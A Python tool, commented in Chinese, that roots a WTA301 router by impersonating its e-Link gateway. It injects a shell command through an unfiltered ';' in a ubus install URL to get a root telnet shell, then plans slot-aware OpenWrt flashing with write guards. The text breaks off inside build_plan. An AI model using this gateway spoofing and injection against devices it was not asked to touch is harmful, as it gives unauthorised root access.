#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
wta301-getroot.py —— 一键在原厂固件上取得 root，并可继续刷入 OpenWrt（A 槽）

用法：
    python wta301-getroot.py                                  # 无参数 = 交互式菜单
    python wta301-getroot.py --flash-op PKG.bin               # 取完 root 刷 OpenWrt 到 A 槽
    python wta301-getroot.py --flash-uboot KIT.bin            # 只刷 u-boot kit，保留当前固件
    python wta301-getroot.py --flash-stock auto               # 刷回原厂（自己找镜像，只认 md5）
    python wta301-getroot.py --flash-stock bslot              # 刷回原厂（从 B 槽拷，需经 md5 门禁）
    ... 任意一个加 --dry-run                                   # 只打印计划，不写入

依赖：Python 3.8+，同目录或 ../work/net 下有 srv.py 与 elink_gw4.py（纯 stdlib + cryptography）
权限：必须管理员（Windows）/ root（Linux）—— 要加 IP 别名与放行入站端口

原理（已实测，见 docs/GETROOT-AND-NORMAL-USER-FLASH.md）：
    设备上的 elinkclt 周期性反连「网关」的 32768 端口。只要该网关地址在 LAN 上
    没人占，给本机加一个 /32 别名就合法地成了它的网关。握手 DH128 + AES-128-CBC
    （magic 0x3f721fb5），随后下发
        ubus_call ctcapd.appd install {"url": "http://<PC>:8099/x;(<cmd>);"}
    appd 用 asprintf 拼 `wget <url>` 再 popen，URL 未过滤 ';' ⇒ 命令注入。
    注入的 telnetd 以 root 跑 ⇒ telnet <设备>:2323 直接是 uid=0。

═══════════════════════════════════════════════════════════════════════════
★★★ 分区表 —— 最容易搞死的地方 ★★★
═══════════════════════════════════════════════════════════════════════════

以下全部来自板上 /sys/class/mtd/mtdN/offset（十进制已换算成十六进制），
是唯一真源。名字和编号都会骗人，物理偏移不会。

    mtd   偏移         大小         名字               归属
    0     0x00000000  0x003c0000  factory_boot       一级 u-boot（永不写）
    1     0x00400000  0x00020000  factory_info       机型/MAC（永不写）
    2     0x00480000  0x00020000  art                校准（永不写）
    3     0x00500000  0x00200000  config             UBI（内含卷 mtd15）
    4     0x00700000  0x00040000  normal_boot        u-boot   B 槽
    5     0x00880000  0x00400000  kernel             kernel   B 槽
    6     0x00fc0000  0x00c00000  rootfs             rootfs   B 槽
    7     0x06a00000  0x01600000  rootfs_data        原厂 overlay（内含卷 mtd16）
    8     0x00800000  0x02620000  firmware           容器     B 槽
    9     0x04700000  0x00040000  normal_boot_bak    u-boot   A 槽
    10    0x04880000  0x00400000  kernel_bak         kernel   A 槽
    11    0x04fc0000  0x00c00000  rootfs_bak         rootfs   A 槽
    12    0x06a00000  0x01600000  rootfs_data_bak    与 mtd7 同一块
    13    0x04800000  0x02620000  firmware_bak       容器     A 槽
    14    0x04000000  0x00020000  boot_flag          55aa4246 00000001

    A 槽 = 0x4700000 u-boot / 0x4880000 kernel / 0x4FC0000 rootfs = mtd9/10/11
    B 槽 = 0x0700000 u-boot / 0x0880000 kernel / 0x0FC0000 rootfs = mtd4/5/6

  boot_flag = 55aa4246 00000001 ⇒ 一级 u-boot 先检 image_1(B 槽)，
  过了就用 B 槽的 u-boot 起。image_2 = A 槽。

★★★ 我在这一节犯过的两次错（留档，别再犯）★★★

  错误 1：「原厂/我们的 mtd 名字互为主备」。不成立。实测原厂 shell 里
          md5sum /dev/mtdblock10 = 2868d8e9… = mtd10_kernel_bak.bin = 0x4880000。
          原厂把 0x4880000 叫 kernel_bak、把 0x880000 叫 kernel_bak ——
          名字和 OpenWrt 一模一样，没有互换。
  错误 2：「两边编号完全一致，A 槽 = mtd5/mtd6」。也是错的，而且更危险。
          原厂视角 mtd5 = 0x880000（B 槽），OpenWrt 视角 mtd5 = 0x4880000（A 槽）。
          同一编号在两个固件里指不同物理位置。

  取证方法（两次都是靠这个纠正的）：
      cat /sys/class/mtd/mtdN/offset   ← 绝对偏移，不会骗人
  教训：偏移只能从设备读，不能凭 md5 反推，更不能凭「能启动」推断。
        我们 kit 的 tpimg_boot_slot() 只验 magic + 长度，md5 错了照样启动。

★★★ 第二道陷阱：原厂 mtd10 只有 4 MiB，装不下 OpenWrt 内核 ★★★

    OpenWrt 内核 FIT totalsize = 0x41526c (4,280,940)
    A 槽 kernel 分区（mtd10）  = 0x400000 (4,194,304)   ← 差 0x1526c，会被截断

    但原厂还有一个 **容器分区** mtd13 "firmware_bak" = 0x4800000 起、0x2620000 长，
    它完整覆盖 A 槽。容器内实测映射（dd + hexdump 逐字节核对过）：

        +0x00000  TP 槽头    00 00 01 00 55 aa 9d d1
        +0x80000  kernel     d0 0d fe ed  (FIT)
        +0x7C0000 rootfs     68 73 71 73  (hsqs)

    ⇒ 内核走 mtd13 并 `seek=4`（0x80000 / 0x20000），绕开 4 MiB 限制。
      原厂下 rootfs 直接写 mtd11（12 MiB，够 11.75 MiB）。
      这两条路径都用 dd 的 skip（源）+ seek（目标）表达，不做任何复制拼接。

为什么放 A 槽：我们的 kit 的 tpimg_boot_slot() **先试 image_2（A 槽头 0x4800000）**，
失败才试 image_1（B 槽头 0x800000）。所以 OpenWrt 放 A 槽即可被拉起，
**不需要动 boot_flag、不需要动任何 u-boot、不碰原厂主槽**。

A 槽头几何（0x4800000）实测：
    +0x58 = 0x04880000  kernel 偏移
    +0x5c = 0x00480000  kernel 长度 (4.5 MiB)   ← 足以容纳 0x41526c
kit 只读这两个字段，**不验 md5**，所以写内核不需要改槽头，也不需要改 md5。

═══════════════════════════════════════════════════════════════════════════
★★★ 第三个陷阱：两种固件的 overlay 在不同的地方 ★★★
═══════════════════════════════════════════════════════════════════════════

“分区名字互为上下”只在【运行时 dd】时才害人；走到启动阶段，
两种内核各带各的分区映射，而 overlay 更是物理分离的：

    固件        mtd     起址        长度      终点        说明
    原厂        mtd7    0x6a00000  0x1600000  0x8000000   ubi.mtd=7（内核 cmdline 写死）
    原厂        mtd12   0x6a00000  0x1600000  0x8000000   rootfs_data_bak，就是同一块
    我们        mtd12   0x1bc0000  0x2440000  0x4000000   ubi.mtd=rootfs_data3，卷名 wta301data

    [0x1bc0000, 0x4000000) 与 [0x6a00000, 0x8000000) 不重叠。

⇒ **两个固件的设置互不干扰**。切到 OpenWrt 就挂 OpenWrt 那份 overlay，
  切回原厂就挂原厂那份，两边各自的 Wi-Fi/密码/包都保留。

⇒ **本脚本默认不碰任何 overlay**（两个区域都在写入目标之外）。
  只有你显式加 `--reset-overlay stock|openwrt` 才会擦。

⚠️ 历史坑：早期版本的 OpenWrt 把 overlay 放在 0x6a00000（和原厂撞车），
写了 w5/r0 格式的 UBIFS；原厂 4.4.60 只支持 w4/r0，于是挂不上、
退回 ramdisk、/proc 全灭。现在 DTS 已改到 0x1bc0000。
如果看到原厂 `/proc/mtd` 缺失，就 `--reset-overlay stock` 擦掉 0x6a00000，
原厂下次启动会自己重建 w4（已实测）。
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import platform
import re
import socket
import subprocess
import sys
import threading
import time

# ---------------------------------------------------------------------------
# 常量
# ---------------------------------------------------------------------------

ELINK_PORT = 32768
SRV_PORT = 8099
NC_BACKUP_PORT = 8098   # 设备 `dd | nc PC 8098` 把整片推回来，PC 侧监听

# 我们的 u-boot kit 的 md5（mtd4 / mtd9 应为它）
KIT_UBOOT_MD5 = "d0ada9f76e4f1aba9b96a559a5220cee"

# OpenWrt 完整包布局（实测 wta301-op-25.12.6-p29.bin，总长 0x1060000）
#   0x000000  头 0x20000
#   0x020000  FIT 内核区 0x480000（FIT 实占 0x41526c，其余 0xFF）
#   0x4a0000  squashfs 0xBC0000 至 EOF
PKG_KERNEL_OFF = 0x020000
PKG_KERNEL_LEN = 0x480000
PKG_ROOTFS_OFF = 0x4a0000
PKG_ROOTFS_LEN = 0xBC0000
PKG_TOTAL = 0x1060000

DD_BS = 0x20000  # 128 KiB；上述所有偏移与长度都是它的整数倍


# ★★★ 分区编号陷阱（改代码前务必读完）
#
# 一级 u-boot 的双槽镜像：
#     image_1 = B 槽 = 0x0080000 容器 / 0x0880000 kernel / 0x0FC0000 rootfs
#     image_2 = A 槽 = 0x4800000 容器 / 0x4880000 kernel / 0x4FC0000 rootfs
# boot_flag(mtd14) = 55aa4246 00000001 -> 先验 image_1(B)，通过就用它。
#
# 【编号】只在同一固件内稳定，跨固件会错位：
#     原厂 4.4.60 视角：    mtd5  = 0x880000  (B kernel)
#                          mtd10 = 0x4880000 (A kernel)
#     我们 OpenWrt 视角：   mtd5  = 0x4880000 (A kernel)
#   所以 mtd5 在原厂是 B 槽内核、在 OpenWrt 是 A 槽内核。按编号跨固件搬运
#   必然写错槽，判断落点只能用物理偏移（MTD_OFFSET）。
#
# 【分区数量】也不同。原厂 17 条 = 15 个物理分区 + 2 个 UBI 卷：
#     mtd15 erasesize 0x1f000 名字 "0"  <- mtd3 config 里的卷
#     mtd16 erasesize 0x1f000 名字 "0"  <- mtd7 rootfs_data 里的卷
#   erasesize 不是 0x20000 的一律不是物理分区，绝不能 dd。
#
# ★ 这里我犯过的错（留档防再犯）：
#   先写「原厂/我们的 mtd 名字互为主备」，又改成「编号完全一致、
#   A 槽 = mtd5/mtd6」。两次都错。用 /sys/class/mtd/mtdN/offset 一查就清楚。
#   教训：偏移只能从设备读，不能凭 md5 或「能启动」反推。
SLOT_A = {"kernel": 10, "rootfs": 11}  # 0x04880000 / 0x04FC0000，只动这里
SLOT_B = {"kernel": 5, "rootfs": 6}    # 0x00880000 / 0x00FC0000，回退用

# 权威分区偏移（板上 /sys/class/mtd/mtdN/offset 实测，十进制换算成十六进制）。
# 这张表是唯一真源：mtd 名字是陷阱，编号只在同一固件内稳定，物理偏移才不变。
MTD_OFFSET = {
    0: 0x0000000,   # factory_boot   （永不写）
    1: 0x0400000,   # factory_info   （永不写）
    2: 0x0480000,   # art            （永不写）
    3: 0x0500000,   # config         UBI，内含卷 mtd15
    4: 0x0700000,   # normal_boot    u-boot B 槽
    5: 0x0880000,   # kernel         kernel B 槽
    6: 0x0FC0000,   # rootfs         rootfs B 槽
    7: 0x6A00000,   # rootfs_data    原厂 overlay，内含卷 mtd16
    8: 0x0800000,   # firmware       容器 B 槽
    9: 0x4700000,   # normal_boot_bak u-boot A 槽
    10: 0x4880000,  # kernel_bak     kernel A 槽
    11: 0x4FC0000,  # rootfs_bak     rootfs A 槽
    12: 0x6A00000,  # rootfs_data_bak（与 mtd7 同一块）
    13: 0x4800000,  # firmware_bak   容器 A 槽
    14: 0x4000000,  # boot_flag
}


# 正在运行的那个 rootfs 分区。两种固件都从它起根，写它就是写脚下的地板。
#   原厂   内置 cmdline: root=/dev/mtdblock6（编译进 vmlinux，忽略 u-boot 传参）
#   OpenWrt DTS bootargs-append: root=/dev/mtdblock6
# ⇒ 两种固件下都是 mtd6。写它的那一步必须放最后，且写完立刻 reboot，
#   中间绝不能再从它读任何东西（squashfs 是只读挂载，缺页时才去 flash 取）。
LIVE_ROOT_MTD = 6   # 两种固件的 cmdline 都写 root=/dev/mtdblock6；见 live_root_abs()

# 已知的原厂镜像集（md5 已用全盘原厂镜像 flash_full_128M.bin 逐段 dd 验证）：
#   A_kernel 0x4880000/0x400000 = 170b2188… = mtd5_kernel.bin
#   A_rootfs 0x4fc0000/0xC00000 = 30f48741… = mtd6_rootfs.bin
#   B_kernel 0x0880000/0x400000 = 2868d8e9… = mtd10_kernel_bak.bin
#   B_rootfs 0x0fc0000/0xC00000 = bf2f92ce… = mtd11_rootfs_bak.bin
# 列表顺序 = 优选顺序（先最新厂固件 2.0.2，再旧版 4.4.60）。
STOCK_SETS = [
    {"name": "原厂 2.0.2 (2024-12-04，A 槽出厂内容)",
     "kernel": "mtd5_kernel.bin",  "kernel_md5": "170b2188884cc040d64ac5bed7ddc365",
     "rootfs": "mtd6_rootfs.bin",  "rootfs_md5": "30f487419d90b2239b65035390f3b73f"},
    {"name": "原厂 4.4.60 (2024-11-28，B 槽备份)",
     "kernel": "mtd10_kernel_bak.bin", "kernel_md5": "2868d8e975da7c641e54c72b6beb8f26",
     "rootfs": "mtd11_rootfs_bak.bin", "rootfs_md5": "bf2f92ceaf509093c8854825f2dc8d5e"},
]

# 把 STOCK_SETS 汇总成 md5 对 -> 版本名，用于「这段内容是不是原厂」的判定。
# 判定必须认【全部】已知版本，不能只认一套 —— 实测这台板子的 A 槽装的是
# 旧版 4.4.60（2868d8e9 / bf2f92ce），按 2.0.2 那套比对就会误报「非原厂」。
def stock_md5_pairs():
    return {(x["kernel_md5"], x["rootfs_md5"]): x["name"] for x in STOCK_SETS}


# 旧版兼容：bslot 模式拿它做硬门禁
STOCK_KNOWN_MD5 = {
    "kernel": "2868d8e975da7c641e54c72b6beb8f26",
    "rootfs": "bf2f92ceaf509093c8854825f2dc8d5e",
}

# 原厂镜像的整分区长度（B 槽实测：kernel 0x400000 / rootfs 0xC00000）
STOCK_LEN = {"kernel": 0x400000, "rootfs": 0xC00000}


def find_stock_set(extra_dir=None, prefer=None):
    """在几个常规位置找一对【md5 完全对得上】的原厂镜像。

    绝不按文件名信 —— 文件名可以随便取。只认 md5。

    prefer="bslot" 时优先找 B 槽那组（2868d8e9 / bf2f92ce），
    因为修 B 槽必须写回 B 槽头上的 md5 对应的那两份内容。
    """
    here = os.path.dirname(os.path.abspath(__file__))
    dirs = [
        os.path.join(here, "stock"),
        here,
        os.path.join(os.path.dirname(here), "work", "backup"),
        os.path.join(os.path.dirname(os.path.dirname(here)), "work", "backup"),
        os.path.join(os.getcwd(), "stock"),
        os.getcwd(),
        os.path.join(os.getcwd(), "work", "backup"),
    ]
    if extra_dir:
        dirs.insert(0, extra_dir)
    seen = set()
    for d in dirs:
        d = os.path.abspath(d)
        if d in seen or not os.path.isdir(d):
            continue
        seen.add(d)
        order = STOCK_SETS
        if prefer == "bslot":
            order = [x for x in STOCK_SETS if x["kernel_md5"] == STOCK_KNOWN_MD5["kernel"]]
        for s in order:
            kp = os.path.join(d, s["kernel"])
            rp = os.path.join(d, s["rootfs"])
            if not (os.path.exists(kp) and os.path.exists(rp)):
                continue
            if _md5_file(kp) != s["kernel_md5"] or _md5_file(rp) != s["rootfs_md5"]:
                info("   %s 里有同名文件但 md5 不对（不是原厂镜像），忽略：%s" % (d, s["name"]))
                continue
            info("   找到可用原厂镜像：%s" % s["name"])
            info("     kernel %s (%s)" % (s["kernel_md5"], os.path.basename(kp)))
            info("     rootfs %s (%s)" % (s["rootfs_md5"], os.path.basename(rp)))
            return s, kp, rp
    return None, None, None


def _md5_file(path, chunk=1 << 20):
    h = hashlib.md5()
    with open(path, "rb") as f:
        while True:
            b = f.read(chunk)
            if not b:
                break
            h.update(b)
    return h.hexdigest()

# 各 mtd 的 flash 绝对起始（用于换算 dd seek → 绝对地址，做重叠检查）
MTD_ABS = MTD_OFFSET   # 历史变量名，build_plan 用它换算绝对地址

# 某些落点的 mtd 编号在不同固件下语义不同，显式登记 (mtd, seek) → 由 MTD_ABS 换算
FLASH_ABS = {}


# 各固件下的 A 槽落点。
#   src_skip  : 在包内的块偏移（内核 1 块 = 0x20000；rootfs 37 块 = 0x4a0000）
#   dst_mtd   : 目标 mtdblock 编号
#   dst_seek  : 在该分区内的块偏移
#   max_len   : 该落点能容纳的字节数（硬上限，超过就拒绝写）
FLASH_TARGETS = {
    "stock": {
        # 当前跑原厂：目标是【A 槽】。
        #   kernel -> mtd13(容器 0x4800000) +0x80000 = 0x4880000
        #             直写 mtd10 只有 0x400000，装不下 FIT 的 0x41526c
        #   rootfs -> mtd11 = 0x4FC0000（原厂视角的 rootfs_bak）
        #             ★ 不能写 mtd6！mtd6 = 0xFC0000 属 B 槽，
        #               而原厂此时正从 mtd6 起根，写它就是在写活分区。
        "kernel": {"dst_mtd": 13, "dst_seek": 4, "max_len": 0x480000,
                   "why": "A 槽容器 firmware_bak +0x80000（= 0x4880000）；"
                          "直写 mtd10 只有 4MiB，装不下 0x41526c 会被截断"},
        "rootfs": {"dst_mtd": 11, "dst_seek": 0, "max_len": 0xC00000,
                   "why": "A 槽 rootfs（原厂视角 mtd11 = 0x4FC0000），装得下 0xBC0000"},
    },
    "openwrt": {
        # 当前跑 OpenWrt：我们的 DTS 视角下 A 槽就是 mtd5/mtd6。
        "kernel": {"dst_mtd": 5, "dst_seek": 0, "max_len": 0x740000,
                   "why": "A 槽 kernel 分区（我们的 DTS 给了 7.25MiB）"},
        "rootfs": {"dst_mtd": 6, "dst_seek": 0, "max_len": 0xC00000,
                   "why": "A 槽 rootfs 分区（OpenWrt 视角 mtd6 = 0x4FC0000）"},
    },
}

# 绝不触碰（原厂主槽 + 引导链）+ overlay 保护区。脚本在写之前会核对每个落点。
# ★★★ 硬禁止：写这些 = 直接变砖，没有例外，--yes 也绕不过 ★★★
#
# 判断依据（来自 mtd0 里的字符串，不是推测）：
#   mtd0  未压缩，含 tftp / nand read / nand write / nand erase / bootm / crc32 /
#         failsafe / bootipq，还有一整套 Web 恢复界面（/index.html、/flashing.html、
#         "start www server for firmware recovery"、"HTTP ugrade is done! Rebooting..."），
#         以及 "Firmware check failed! Enter recovery mode."（两槽都验不过时进恢复模式）
#         ⇒ mtd0 是唯一的终极救砖出口。写坏它 = 只能拆机上编程器。
#   mtd1  机型 / MAC，写错无法恢复。
#   mtd2  射频校准（ART），写错射频废掉。
#   mtd14 boot_flag。虽然 mtd0 里有
#         "Read BootFlag failed, so set it to default and write to flash."
#         会自动重写默认值，但仍不主动碰它。
HARD_DENY = {
    0:  ("factory_boot", "一级 u-boot + SBL/QSEE/CDT，唯一的终极救砖出口"),
    1:  ("factory_info", "机型 / MAC，写错无法恢复"),
    2:  ("art",          "射频校准数据，写错射频废掉"),
    14: ("boot_flag",    "一级 u-boot 的槽选择标志"),
}

# 需要明确授权的落点：写它们不变砖，但会毁掉某种回退能力。
# 每一项单独列出「允许哪个操作写我」—— 不用全局白名单，因为那样
# mtd4（u-boot B 槽）会被 "flash-op" 顺带放行，而 flash-op 从不该写 mtd4。
GUARDED = {
    4:  ("normal_boot  B 槽二级 u-boot",
         {"flash-uboot"},
         "写完只剩 A 槽 u-boot 还能被一级加载"),
    9:  ("normal_boot_bak  A 槽二级 u-boot",
         {"flash-uboot"},
         "写完只剩 B 槽 u-boot"),
    5:  ("kernel  B 槽内核",
         {"restore-bslot"},
         "原厂回退用的内核"),
    6:  ("rootfs  B 槽 rootfs",
         {"restore-bslot", "flash-op"},
         "原厂回退用的根文件系统；跑原厂时它就是活动分区"),
}

# A 槽（mtd10/mtd11）不在 GUARDED 里 —— 它是我们自己的槽，随便刷。
# 数据区（mtd7/mtd12）也不在 —— 擦它只丢设置。


class RefusedWrite(Exception):
    """写入被安全门禁拒绝。"""


def guard_write(mtd_idx, purpose):
    """每一次真正的 dd 写入之前都必须过这里。

    故意抛异常而不是返回布尔 —— 返回布尔会被调用方漏判，
    抛异常漏不掉：没接住就是崩溃，而崩溃也不会写入。
    """
    if mtd_idx in HARD_DENY:
        name, why = HARD_DENY[mtd_idx]
        raise RefusedWrite(
            "拒绝写入 mtd%d（%s）。\n"
            "     原因：%s\n"
            "     这是硬性禁止，--yes 无法绕过。" % (mtd_idx, name, why))
    if mtd_idx in GUARDED:
        name, allowed, why = GUARDED[mtd_idx]
        if purpose not in allowed:
            raise RefusedWrite(
                "拒绝写入 mtd%d（%s）。\n"
                "     操作 %r 没有写这个分区的权限（允许：%s）。\n"
                "     关于这一区：%s"
                % (mtd_idx, name, purpose,
                   " / ".join(sorted(allowed)), why))


# 两种固件各自的 overlay（可写数据区）。物理分离，互不干扰。
OVERLAYS = {
    "stock":   {"start": 0x6A00000, "len": 0x1600000, "name": "mtd7 rootfs_data",
                "mtd": 7, "ubi_volume": "(无卷名，ubi.mtd=7)",
                "why": "原厂内核 cmdline 写死 ubi.mtd=7；只认 w4/r0 UBIFS"},
    "openwrt": {"start": 0x1BC0000, "len": 0x2440000, "name": "mtd12 rootfs_data3",
                "mtd": 12, "ubi_volume": "wta301data",
                "why": "bootargs-append 里 ubi.mtd=rootfs_data3 fstools_overlay_name=wta301data"},
}


def overlay_of(fw):
    o = OVERLAYS[fw]
    return o["start"], o["start"] + o["len"], o


def overlaps(a0, a1, b0, b1):
    return a0 < b1 and a1 > b0


# ---------------------------------------------------------------------------
# 输出
# ---------------------------------------------------------------------------

def _utf8_stdout():
    """Windows 控制台默认 GBK，输出中文会成乱码；统一成 UTF-8。"""
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8", errors="replace")
        except (AttributeError, ValueError):
            pass


def die(msg, code=1):
    print("!! " + msg, file=sys.stderr, flush=True)
    sys.exit(code)


def info(msg=""):
    print(msg, flush=True)


def _run(cmd, quiet=True):
    r = subprocess.run(cmd, shell=isinstance(cmd, str), capture_output=True)
    out = (r.stdout + r.stderr).decode("utf-8", "replace").strip()
    if not quiet and out:
        info("   $ %s -> %s" % (cmd if isinstance(cmd, str) else " ".join(cmd), out[:200]))
    return r.returncode, out


# ---------------------------------------------------------------------------
# 阶段 1：让本机冒充网关
# ---------------------------------------------------------------------------

def iface_index(ip_hint):
    code, out = _run(["powershell", "-NoProfile", "-Command",
                      "Get-NetIPAddress -AddressFamily IPv4 | "
                      "Where-Object {$_.IPAddress -eq '%s'} | "
                      "Select-Object -ExpandProperty InterfaceIndex" % ip_hint])
    for tok in out.split():
        if tok.isdigit():
            return int(tok)
    return None


def setup_alias(addrs, pc_ip):
    """加网关地址的 /32 别名；返回清理函数。"""
    system = platform.system()
    added = []

    if system == "Windows":
        idx = iface_index(pc_ip)
        if idx is None:
            die("找不到地址为 %s 的网卡。先 ipconfig 确认有线口 IP，再 --pc-ip 指定。" % pc_ip)
        info("   网卡 InterfaceIndex=%d（持有 %s）" % (idx, pc_ip))
        for a in addrs:
            rc, out = _run(["powershell", "-NoProfile", "-Command",
                            "New-NetIPAddress -InterfaceIndex %d -IPAddress %s "
                            "-PrefixLength 32 -SkipAsSource $true -ErrorAction Stop"
                            % (idx, a)])
            if rc != 0 and not ("already exists" in out.lower() or "已存在" in out):
                info("   ! 别名 %s 未加成功：%s" % (a, out[:160]))
            else:
                added.append(a)
                info("   + 别名 %s/32 (SkipAsSource)" % a)
        for name, port in (("WTA_ELINK", ELINK_PORT), ("WTA_SRV", SRV_PORT),
                           ("WTA_BKUP", NC_BACKUP_PORT)):
            _run("netsh advfirewall firewall add rule name=%s dir=in action=allow "
                 "protocol=TCP localport=%d" % (name, port))
            info("   + 防火墙放行 TCP %d (%s)" % (port, name))

        def cleanup():
            for a in added:
                _run(["powershell", "-NoProfile", "-Command",
                      "Remove-NetIPAddress -IPAddress %s -PrefixLength 32 "
                      "-Confirm:$false -ErrorAction SilentlyContinue" % a])
                info("   - 删除别名 %s" % a)
            for name in ("WTA_ELINK", "WTA_SRV", "WTA_BKUP"):
                _run("netsh advfirewall firewall delete rule name=%s" % name)
            info("   - 删除防火墙规则")
        return cleanup

    dev = _default_dev()
    for a in addrs:
        rc, out = _run(["ip", "addr", "add", "%s/32" % a, "dev", dev])
        if rc == 0:
            added.append((a, dev))
            info("   + 别名 %s/32 @ %s" % (a, dev))
        else:
            info("   ! 别名 %s 未加成功：%s" % (a, out[:120]))

    def cleanup_linux():
        for a, d in added:
            _run(["ip", "addr", "del", "%s/32" % a, "dev", d])
            info("   - 删除别名 %s" % a)
    return cleanup_linux


def _default_dev():
    code, out = _run("ip route show default")
    parts = out.split()
    return parts[parts.index("dev") + 1] if "dev" in parts else None


# ---------------------------------------------------------------------------
# 阶段 2：e-Link 模拟器 + HTTP 服务（必须与轮询同进程）
# ---------------------------------------------------------------------------

HERE = os.path.dirname(os.path.abspath(__file__))


def find_script(name):
    for cand in (os.path.join(HERE, name),
                 os.path.join(HERE, "..", "net", name),
                 os.path.join(HERE, "..", "work", "net", name)):
        if os.path.exists(cand):
            return os.path.abspath(cand)
    return None


class Servers:
    """把 HTTP 服务、e-Link 模拟器、轮询放进【同一进程】。

    这是本项目最关键的运维约束：终端/SSH 会话一结束，该会话派生的整个进程树
    都会被回收（Windows 上 sshd 用 job object 管理），DETACHED_PROCESS 也救不了。
    服务器进程必须与「等待回连」的循环同生共死。见 lesson sqbjop6。
    """

    def __init__(self, target_ip, pc_ip, payload, serve_dir, lifetime):
        self.target_ip = target_ip
        self.pc_ip = pc_ip
        self.payload = payload
        self.serve_dir = serve_dir
        self.lifetime = lifetime
        self.procs = []

    def start(self):
        srv = find_script("srv.py")
        elink = find_script("elink_gw4.py")
        if not srv or not elink:
            die("找不到 srv.py / elink_gw4.py。\n"
                "    把这两个文件放在本脚本同目录，或 仓库的 work/net/ 下。")

        env = dict(os.environ)
        env.update({"ELINK_PORT": str(ELINK_PORT), "SRV_PORT": str(SRV_PORT),
                    "WTA_HOST": self.target_ip, "SPOOF": "192.168.0.1",
                    "PC_IP": self.pc_ip})

        os.makedirs(self.serve_dir, exist_ok=True)
        with open(os.path.join(self.serve_dir, "x"), "w") as f:
            f.write("ok\n")

        def spawn(name, args):
            log = open(os.path.join(self.serve_dir, name + ".log"), "wb")
            p = subprocess.Popen([sys.executable] + args,
                                 cwd=os.path.dirname(srv), env=env,
                                 stdout=log, stderr=subprocess.STDOUT,
                                 stdin=subprocess.DEVNULL)
            info("   + %-6s pid=%d" % (name, p.pid))
            self.procs.append(p)
            return p

        self.srv = spawn("srv", [srv, "--root", self.serve_dir, "--port", str(SRV_PORT)])
        time.sleep(1.0)
        self.elink = spawn("elink", [elink, str(self.lifetime), "ctcapd.appd",
                                     "install", json.dumps({"url": self.payload})])
        time.sleep(2.0)
        info("   + payload: %s" % self.payload)

    def alive(self):
        return bool(self.procs) and all(p.poll() is None for p in self.procs)

    def stop(self):
        for p in self.procs:
            try:
                p.terminate()
            except Exception:
                pass


def wait_for_root(ip, servers, timeout):
    info("")
    info("[3] 等设备自己回连（周期是秒级，不要碰它）")
    t0 = time.time()
    last = 0.0
    while time.time() - t0 < timeout:
        s = socket.socket()
        s.settimeout(1.5)
        rc = s.connect_ex((ip, 2323))
        s.close()
        el = time.time() - t0
        if rc == 0:
            info("   *** 2323 OPEN  t=%.0fs ***" % el)
            return True
        if not servers.alive():
            info("   ! 监听进程已退出，重启（计时重置）")
            servers.stop()
            servers.start()
            t0 = time.time()
            continue
        if el - last >= 30:
            info("   [%3.0fs] 仍在等…（监听正常）" % el)
            last = el
        time.sleep(2)
    return False


# ---------------------------------------------------------------------------
# 阶段 3：telnet 会话
# ---------------------------------------------------------------------------

class Telnet:
    def __init__(self, ip, port=2323, timeout=12):
        self.s = socket.create_connection((ip, port), timeout)
        self.s.settimeout(timeout)
        time.sleep(1.0)
        try:
            self.s.recv(8192)
        except Exception:
            pass

    def sh(self, cmd, wait=2.0):
        self.send(cmd)
        return self.drain(wait)

    def send(self, cmd):
        """只发命令，不读回显。给「命令要跑很久、输出走别的通道」用。

        为什么需要：`dd | nc` 的输出走 nc 的 socket，不走 telnet。
        若照 sh() 那样 sleep 完再 recv，会和后续命令抢同一个套接字 ——
        实测后果是 mtd9~mtd14 整批失败（命令串到一起）。
        """
        self.s.sendall(cmd.encode() + b"\n")

    def drain(self, wait=2.0, hard_timeout=2.0):
        """读走已到达的输出。可重复调用；超时即返回已收内容。"""
        time.sleep(wait)
        buf = b""
        try:
            self.s.settimeout(hard_timeout)
        except OSError:
            return ""
        while True:
            try:
                d = self.s.recv(65535)
            except Exception:
                break
            if not d:
                break
            buf += d
        return buf.decode("utf-8", "replace").replace("\r", "")

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


def live_root_abs(tn):
    """返回当前运行中 rootfs 的【物理绝对偏移】，取不到就返回 None。

    为什么不能用 mtd 编号或名字：
      原厂 cmdline  root=/dev/mtdblock6 -> mtd6 = 0x0FC0000（B 槽）
      OpenWrt cmdline root=/dev/mtdblock6 -> mtd6 = 0x4FC0000（A 槽）
    编号都是 6，物理位置完全不同。只有偏移是唯一真源。
    """
    out = tn.sh("cat /proc/cmdline", 4.0)
    m = re.search(r"root=/dev/mtdblock(\d+)", out)
    if not m:
        return None
    idx = int(m.group(1))
    raw = tn.sh("cat /sys/class/mtd/mtd%d/offset" % idx, 4.0)
    for line in raw.splitlines():
        t = line.strip()
        if t.isdigit():
            return int(t)
    return None


def detect_firmware(tn):
    """用内核版本判定固件，返回 ('stock'|'openwrt'|None, ver)。"""
    out = tn.sh("uname -r", 1.8)
    ver = ""
    for line in out.splitlines():
        line = line.strip()
        if line and not line.startswith("uname") and any(c.isdigit() for c in line):
            ver = line
            break
    info("   内核: %s" % (ver or "(未知)"))
    if ver.startswith("4.4."):
        return "stock", ver
    if ver.startswith("6."):
        return "openwrt", ver
    return None, ver


def read_mtd(tn):
    out = tn.sh("cat /proc/mtd", 2.2)
    table = {}
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith("mtd"):
            continue
        parts = line.split()
        try:
            table[int(parts[0][3:].rstrip(":"))] = (int(parts[1], 16),
                                                    parts[3].strip('"'))
        except (IndexError, ValueError):
            continue
    return table


def md5_of_pkg_slice(data, off, length):
    return hashlib.md5(data[off:off + length]).hexdigest()


# ---------------------------------------------------------------------------
# 阶段 4：刷写
# ---------------------------------------------------------------------------

def build_plan(pkg_path, fw, mtd_table):
    """算出 dd 参数并做全部安全检查。返回 (plan, problems)。"""
    tgts = FLASH_TARGETS[fw]
    problems = []
    data = open(pkg_path, "rb").read()

    if len(data) != PKG_TOTAL:
        problems.append("包大小 0x%x，期望 0x%x" % (len(data), PKG_TOTAL))
        return None, problems

    plan = {"pkg": pkg_path, "pkg_md5": hashlib.md5(data).hexdigest(),
            "parts": {}}

    for part, src_off, src_len in (
            ("kernel", PKG_KERNEL_OFF, PKG_KERNEL_LEN),
            ("rootfs", PKG_ROOTFS_OFF, PKG_ROOTFS_LEN)):
        t = tgts[part]
        mtd = t["dst_mtd"]
        if mtd not in mtd_table:
            problems.append("%s: mtd%d 不存在" % (part, mtd))
            continue
